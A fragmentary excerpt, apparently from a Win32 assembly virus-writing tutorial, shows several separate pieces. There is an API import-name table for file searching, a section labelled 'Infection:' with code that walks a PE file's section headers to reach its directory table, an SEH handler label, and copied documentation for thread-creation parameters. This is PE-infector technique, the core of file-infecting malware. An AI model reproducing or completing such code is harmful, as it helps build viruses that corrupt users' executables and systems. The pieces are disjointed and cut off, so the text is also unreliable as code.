...
;
 ...
 ; one:                                                                     ;
 ;                                                                          ;
 ; ESI points to ──► db         "FindFirstFileA",0                          ;
 ;                   db         "FindNextFileA",0                           ;
 ;                   db         "CloseHandle",0                             ;
 ;                   [...]                                                  ;
 ;                   db         0BBh ; Marks the end of this array          ;
 ;                                                                          ;
 ; EDI points to ──► dd         00000000h ; Future address of FFFA          ;
...
Infection:
 ...
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
        ...
        movzx   eax,word ptr [edi+06h]          ; AX = nº of sections
        dec     eax                             ; AX--
        imul    eax,eax,28h                     ; EAX = AX*28
        add     esi,eax                         ; Normalize
        add     esi,78h                         ; Ptr to dir table
        mov     edx,[edi+74h]                   ; EDX = nº of dir entries
        shl     edx,3                           ; EDX = EDX*8
...
SEH_handler:
 ...
 ■ lpParameter: Specifies  a  single  32-bit  parameter  value passed  to the
   thread.
 
 ■ dwCreationFlags: Specifies additional flags that control  the creation  of
 ...
 ■ hHandle: Identifies the object. For  a  list  of  the  object types  whose
 ...
 ■ If the function fails, the  return  value  is WAIT_FAILED. To get extended
